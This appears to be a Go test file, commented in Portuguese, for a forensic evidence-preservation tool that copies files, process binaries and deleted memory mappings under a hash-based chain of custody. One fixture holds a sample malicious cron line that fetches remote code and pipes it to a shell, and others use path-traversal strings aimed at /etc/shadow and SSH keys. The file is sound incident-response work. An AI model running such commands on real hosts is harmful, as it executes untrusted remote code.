package preserve

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

func coletor(t *testing.T) (*Coletor, string) {
	t.Helper()
	dir := t.TempDir()
	c, err := Novo(dir, nil)
	if err != nil {
		t.Fatalf("Novo: %v", err)
	}
	return c, dir
}

// A trava mais importante do pacote: um destino que não existe é ERRO de
// invocação, não um diretório a criar. Criar caminho sozinho é como uma coleta
// vai parar em /root/incidente em vez do disco externo que o operador montou.
func TestNovoExigeDiretorioQueJaExiste(t *testing.T) {
	if _, err := Novo(filepath.Join(t.TempDir(), "nao-existe"), nil); !errors.Is(err, ErrSemDir) {
		t.Errorf("diretório ausente deveria dar ErrSemDir, deu %v", err)
	}
	arq := filepath.Join(t.TempDir(), "arquivo")
	if err := os.WriteFile(arq, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Novo(arq, nil); !errors.Is(err, ErrSemDir) {
		t.Errorf("arquivo comum como --out deveria dar ErrSemDir, deu %v", err)
	}
}

// Sobrescrever apagaria a PRIMEIRA cópia, que é a que foi feita mais perto do
// incidente — e portanto a boa. A recusa é o que protege isso.
func TestNaoSobrescreveEvidencia(t *testing.T) {
	c, dir := coletor(t)
	origem := filepath.Join(t.TempDir(), "implante")
	if err := os.WriteFile(origem, []byte("primeira"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := c.Arquivo(origem); err != nil {
		t.Fatalf("primeira cópia: %v", err)
	}

	// O mesmo caminho, com conteúdo NOVO: é exatamente o caso perigoso — o
	// atacante trocou o arquivo entre uma coleta e outra.
	if err := os.WriteFile(origem, []byte("segunda"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := c.Arquivo(origem); !errors.Is(err, ErrExiste) {
		t.Fatalf("segunda cópia deveria ser recusada, deu %v", err)
	}
	if len(c.Erros) != 1 {
		t.Fatalf("a recusa precisa aparecer no manifesto: %+v", c.Erros)
	}

	// E a amostra no disco continua sendo a primeira.
	b, err := os.ReadFile(filepath.Join(dir, "file-"+nomeSeguro(origem)+".bin"))
	if err != nil {
		t.Fatal(err)
	}
	if string(b) != "primeira" {
		t.Errorf("a amostra guardada é %q — a primeira cópia foi perdida", b)
	}
}

func TestArquivoGuardaHashDosDoisLadosEOStat(t *testing.T) {
	c, dir := coletor(t)
	origem := filepath.Join(t.TempDir(), "cron.sh")
	conteudo := []byte("#!/bin/sh\ncurl http://x/y|sh\n")
	if err := os.WriteFile(origem, conteudo, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := c.Arquivo(origem); err != nil {
		t.Fatalf("Arquivo: %v", err)
	}
	if len(c.Itens) != 1 {
		t.Fatalf("itens = %d", len(c.Itens))
	}
	it := c.Itens[0]

	soma := sha256.Sum256(conteudo)
	if it.HashOrigem != hex.EncodeToString(soma[:]) {
		t.Errorf("HashOrigem = %s, queria o sha256 do conteúdo", it.HashOrigem)
	}
	if it.HashCopia != it.HashOrigem {
		t.Errorf("a cópia não bate com a origem: %s vs %s", it.HashCopia, it.HashOrigem)
	}
	if it.Bytes != int64(len(conteudo)) {
		t.Errorf("Bytes = %d, queria %d", it.Bytes, len(conteudo))
	}
	// O stat é metade da custódia: sem modo e datas a amostra não conta de onde
	// veio, e o ctime é a data que o `touch` não falsifica (runbook §9).
	if it.Modo == "" || it.ModUTC == "" || it.MetaUTC == "" {
		t.Errorf("faltou stat no manifesto: %+v", it)
	}
	// Dono presente e com valor: um uid ausente e um uid 0 dizem coisas
	// diferentes, e o manifesto precisa saber separá-las.
	if it.UID == nil || it.GID == nil || *it.UID != os.Getuid() {
		t.Errorf("dono não registrado: uid=%v gid=%v", it.UID, it.GID)
	}
	if !strings.HasSuffix(it.Modo, "rwx------") {
		t.Errorf("Modo = %q, queria o modo real do arquivo", it.Modo)
	}
	if _, err := os.Stat(filepath.Join(dir, it.Destino)); err != nil {
		t.Errorf("o item aponta para %s, que não existe: %v", it.Destino, err)
	}
	if div := c.Integro(); len(div) != 0 {
		t.Errorf("Integro reclamou de uma cópia idêntica: %v", div)
	}
}

// A ausência precisa ser DECLARADA. Uma peça que não foi preservada em silêncio
// é a pior saída possível: o operador segue achando que tem a amostra.
func TestOQueFalhaVaiParaOManifesto(t *testing.T) {
	c, _ := coletor(t)
	if err := c.Arquivo("/nao/existe/em/lugar/nenhum"); err == nil {
		t.Fatal("copiar caminho inexistente deveria falhar")
	}
	if len(c.Itens) != 0 {
		t.Errorf("uma falha não pode virar item: %+v", c.Itens)
	}
	if len(c.Erros) != 1 || c.Erros[0].Tipo != "file" {
		t.Fatalf("erros = %+v", c.Erros)
	}
	if c.Erros[0].ID != "preserve_failed" || c.Erros[0].Motivo == "" {
		t.Errorf("a falha precisa dizer o motivo: %+v", c.Erros[0])
	}
	if !strings.Contains(c.Erros[0].Alvo, "/nao/existe") {
		t.Errorf("a falha precisa dizer QUAL alvo ficou de fora: %+v", c.Erros[0])
	}
}

// Divergência entre origem e cópia é o arquivo tendo MUDADO durante a leitura.
// Num incidente isso é achado, não erro de I/O — e o exit code do comando
// depende de Integro enxergar isso.
func TestIntegroAcusaDivergencia(t *testing.T) {
	c := &Coletor{Itens: []Item{
		{Destino: "a.bin", HashOrigem: "aa", HashCopia: "aa"},
		{Destino: "b.bin", HashOrigem: "aa", HashCopia: "bb"},
	}}
	div := c.Integro()
	if len(div) != 1 || !strings.HasPrefix(div[0], "b.bin") {
		t.Fatalf("Integro = %v, queria só b.bin", div)
	}
	if !strings.Contains(div[0], "mudou") {
		t.Errorf("a mensagem precisa dizer o que a divergência SIGNIFICA: %q", div[0])
	}
}

// Exe é a peça que justifica o comando existir: /proc/<pid>/exe abre o binário
// mesmo depois do unlink. Aqui o alvo é o próprio processo de teste — o único
// que se pode ler sem root e sem depender do ptrace_scope.
func TestExeDoProprioProcesso(t *testing.T) {
	c, dir := coletor(t)
	pid := os.Getpid()
	if err := c.Exe(pid); err != nil {
		t.Fatalf("Exe: %v", err)
	}
	it := c.Itens[0]
	if it.PID != pid || it.Tipo != "exe" {
		t.Errorf("item = %+v", it)
	}
	if it.OrigemReal == "" {
		t.Error("OrigemReal precisa trazer o caminho que o /proc revelou: " +
			"para um exe apagado, é o caminho que o arquivo TINHA")
	}
	if it.Bytes == 0 || it.HashOrigem != it.HashCopia {
		t.Errorf("cópia do exe inconsistente: %+v", it)
	}
	// A amostra tem que ser o binário de verdade, não um link ou um vazio.
	b, err := os.ReadFile(filepath.Join(dir, it.Destino))
	if err != nil || len(b) < 4 || string(b[1:4]) != "ELF" {
		t.Errorf("a amostra não é o ELF do processo (%d bytes, err=%v)", len(b), err)
	}
}

// Regressão de um defeito que um cenário achou: o kernel resolve o link de um
// memfd como "/memfd:<nome> (deleted)" — com o sufixo de apagado junto. Trocar a
// ordem dos testes rotula execução fileless como "arquivo apagado", e as duas
// notas mandam o respondedor a lugares diferentes: uma diz para procurar o
// caminho em backup e em log de pacote, a outra diz que esse caminho nunca
// existiu.
func TestNotaDoExeNaoConfundeMemfdComApagado(t *testing.T) {
	casos := []struct {
		link, quer string
	}{
		{"/memfd:x (deleted)", "fileless"},
		{"/memfd:aletheia-test (deleted)", "fileless"},
		{"/memfd:x", "fileless"},
		{"/usr/sbin/nginx (deleted)", "APAGADO"},
		{"/tmp/.y (deleted)", "APAGADO"},
		{"/usr/sbin/nginx", ""},
		// Arquivo que se chama assim de verdade não é memfd: o prefixo é do
		// caminho inteiro, e "/opt/memfd:x" está em disco.
		{"/opt/memfd:x (deleted)", "APAGADO"},
	}
	for _, c := range casos {
		nota := notaDoExe(c.link)
		if c.quer == "" {
			if nota != "" {
				t.Errorf("notaDoExe(%q) = %q, queria nota nenhuma", c.link, nota)
			}
			continue
		}
		if !strings.Contains(nota, c.quer) {
			t.Errorf("notaDoExe(%q) = %q, queria falar de %q", c.link, nota, c.quer)
		}
	}
}

func TestNomeSeguroPreservaOCaminhoSemQuebrarODiretorio(t *testing.T) {
	casos := map[string]string{
		"/usr/local/sbin/x":  "usr_local_sbin_x",
		"/tmp/.hidden/a b":   "tmp_.hidden_a_b",
		"/etc/../etc/shadow": "etc_.._etc_shadow",
	}
	for entrada, quer := range casos {
		if got := nomeSeguro(entrada); got != quer {
			t.Errorf("nomeSeguro(%q) = %q, queria %q", entrada, got, quer)
		}
	}
	// O ponto: nada que saia daqui pode escapar do diretório de destino.
	for _, p := range []string{"/../../etc/shadow", "/a/b/../../../root/.ssh/id_rsa"} {
		if n := nomeSeguro(p); strings.Contains(n, "/") {
			t.Errorf("nomeSeguro(%q) = %q — ainda tem separador", p, n)
		}
	}
}

// destino é a última barreira: mesmo que um nome chegue com caminho, a escrita
// não sai de --out.
func TestDestinoNaoEscapaDoDiretorio(t *testing.T) {
	c, dir := coletor(t)
	p, err := c.destino("../../fora.bin")
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Dir(p) != dir {
		t.Errorf("destino = %q, queria dentro de %q", p, dir)
	}
}

// A prova de que o --mem captura o mapeamento APAGADO de ponta a ponta, sem
// root: o teste mapeia uma lib e a apaga NO PRÓPRIO PROCESSO — /proc/self/mem é
// legível sem ptrace —, e confere que Memoria escreveu a faixa e a rotulou como
// o código do arquivo removido.
func TestMemoriaCapturaMapeamentoApagado(t *testing.T) {
	arq := filepath.Join(t.TempDir(), "payload.so")
	if err := os.WriteFile(arq, make([]byte, 8192), 0o755); err != nil {
		t.Fatal(err)
	}
	fh, err := os.Open(arq)
	if err != nil {
		t.Fatal(err)
	}
	defer fh.Close()
	m, err := syscall.Mmap(int(fh.Fd()), 0, 8192,
		syscall.PROT_READ|syscall.PROT_EXEC, syscall.MAP_PRIVATE)
	if err != nil {
		t.Fatalf("mmap: %v", err)
	}
	defer syscall.Munmap(m)
	os.Remove(arq) // agora o mapeamento é "<arq> (deleted)" e o arquivo sumiu

	c, dir := coletor(t)
	if err := c.Memoria(os.Getpid()); err != nil {
		t.Fatalf("Memoria: %v", err)
	}
	var achou *Item
	for i := range c.Itens {
		if strings.Contains(c.Itens[i].Nota, "payload.so") {
			achou = &c.Itens[i]
		}
	}
	if achou == nil {
		t.Fatalf("o mapeamento apagado não foi capturado; itens=%d", len(c.Itens))
	}
	if !strings.Contains(achou.Nota, "APAGADO") || !strings.Contains(achou.Nota, "ÚNICA cópia") {
		t.Errorf("a nota tem de dizer que é a única cópia do arquivo removido: %q", achou.Nota)
	}
	if achou.Bytes == 0 {
		t.Error("a faixa foi rotulada mas nada foi lido de /proc/self/mem")
	}
	if fi, err := os.Stat(filepath.Join(dir, filepath.Base(achou.Destino))); err != nil || fi.Size() == 0 {
		t.Errorf("o arquivo do dump não foi escrito: %v", err)
	}
}

// Um FIFO no lugar do arquivo não pode pendurar a coleta — nem levar junto o
// manifesto de custódia.
//
// O `copiar` usava os.Open seco sobre um caminho que o operador copia de um
// achado, ou seja, um caminho num host que o atacante ainda controla. Trocar o
// arquivo por um fifo (ele já escreve naquele diretório — foi lá que o webshell
// apareceu) pendurava o open(2) para SEMPRE.
//
// E o pior não era o travamento: o primeiro SIGINT não alcança, porque o
// bloqueio é anterior ao copiaInterrompivel, que é o único ponto que olha
// c.Parar; o segundo cai em os.Exit(130) e pula o escreverManifesto. O
// diretório ficava com as peças já preservadas e SEM os hashes de origem, que
// só existiam na memória do processo. Evidência sem cadeia de custódia é o que
// o cabeçalho deste pacote chama de pior que coleta nenhuma.
//
// O teste exige as três coisas: volta rápido, recusa DECLARADA (não silêncio), e
// nenhuma peça inventada.
func TestFifoNoLugarDoArquivoNaoPenduraENaoEngoleAFalha(t *testing.T) {
	dir := t.TempDir()
	alvo := filepath.Join(dir, "alvo")
	if err := syscall.Mkfifo(alvo, 0o600); err != nil {
		t.Skipf("mkfifo indisponível: %v", err)
	}
	saida := t.TempDir()
	c, err := Novo(saida, nil)
	if err != nil {
		t.Fatal(err)
	}

	feito := make(chan error, 1)
	go func() { feito <- c.Arquivo(alvo) }()

	select {
	case err := <-feito:
		if err == nil {
			t.Fatal("o fifo foi 'preservado' com sucesso: não há conteúdo para copiar")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Arquivo() não voltou em 10s sobre um fifo — o open(2) está " +
			"bloqueando, e nem o SIGINT alcança esse ponto: a coleta pendura e o " +
			"manifesto de custódia não chega a ser escrito")
	}

	if len(c.Itens) != 0 {
		t.Errorf("peça registrada para um fifo: %+v", c.Itens)
	}
	if len(c.Erros) != 1 {
		t.Fatalf("a recusa NÃO virou lacuna declarada: Erros=%+v — silêncio aqui "+
			"faz o alvo sumir do manifesto como se nunca tivesse sido pedido", c.Erros)
	}
	if !strings.Contains(c.Erros[0].Motivo, "fifo") {
		t.Errorf("o motivo não diz o que foi encontrado: %q", c.Erros[0].Motivo)
	}
}

// Device é recusado ANTES de o open do driver rodar — para device, o estrago
// mora no open(2), não no read(2).
//
// O conserto anterior fazia O_RDONLY|O_NONBLOCK e só DEPOIS perguntava ao fstat
// se era arquivo comum. Tarde: a API de watchdog do kernel é explícita — o
// temporizador ARMA quando /dev/watchdog é aberto, e com `nowayout` fechar não
// desarma. O comentário citava /dev/watchdog como a razão de existir e a
// implementação deixava exatamente ele passar.
//
// O teste não pode abrir um watchdog para provar isso (reiniciaria a máquina),
// então mede a propriedade equivalente e verificável: sobre um device de
// caractere, a recusa acontece e NENHUM descritor de leitura chega a existir. O
// /dev/null serve de dublê — mesmo tipo, mesma classe de open, sem consequência.
func TestDeviceEhRecusadoSemAbrirODriver(t *testing.T) {
	fh, err := abrirRegularProvado("/dev/null")
	if err == nil {
		fh.Close()
		t.Fatal("um device de caractere foi ABERTO para leitura: o open do driver " +
			"rodou, e num /dev/watchdog isso já armou o temporizador do host " +
			"investigado — a recusa depois disso chega tarde")
	}
	if !strings.Contains(err.Error(), "device") {
		t.Errorf("a recusa não nomeia o que encontrou: %v", err)
	}

	// E o caso que NÃO pode ser perdido junto: arquivo comum continua abrindo,
	// e por descritor — é assim que o exe apagado sobrevive.
	dir := t.TempDir()
	alvo := filepath.Join(dir, "bin")
	if err := os.WriteFile(alvo, []byte("conteudo"), 0o600); err != nil {
		t.Fatal(err)
	}
	ok, err := abrirRegularProvado(alvo)
	if err != nil {
		t.Fatalf("arquivo comum deixou de abrir: %v", err)
	}
	defer ok.Close()
	b, _ := io.ReadAll(ok)
	if string(b) != "conteudo" {
		t.Errorf("leu %q pelo descritor reaberto", b)
	}
}

// O exe de um processo vivo continua preservável pelo caminho novo.
//
// É a peça mais valiosa deste pacote: /proc/<pid>/exe abre o binário mesmo
// depois do unlink, e um `kill` destrói a única cópia. A reabertura por
// /proc/self/fd/N preserva isso porque reabre o INODE pinado, não o caminho —
// se ela tivesse sido feita por nome, o exe apagado deixaria de ser coletável e
// o conserto de segurança teria custado a evidência que o pacote existe para
// salvar.
func TestExeDeProcessoVivoContinuaPreservavel(t *testing.T) {
	fh, err := abrirRegularProvado("/proc/self/exe")
	if err != nil {
		t.Fatalf("/proc/self/exe deixou de abrir: %v — o exe é a peça que morre "+
			"com o processo, e sem ela o preserve perde a razão de existir", err)
	}
	defer fh.Close()
	b := make([]byte, 4)
	if n, _ := fh.Read(b); n != 4 || string(b) != "\x7fELF" {
		t.Errorf("o descritor reaberto não é o binário: %q", b[:n])
	}
}
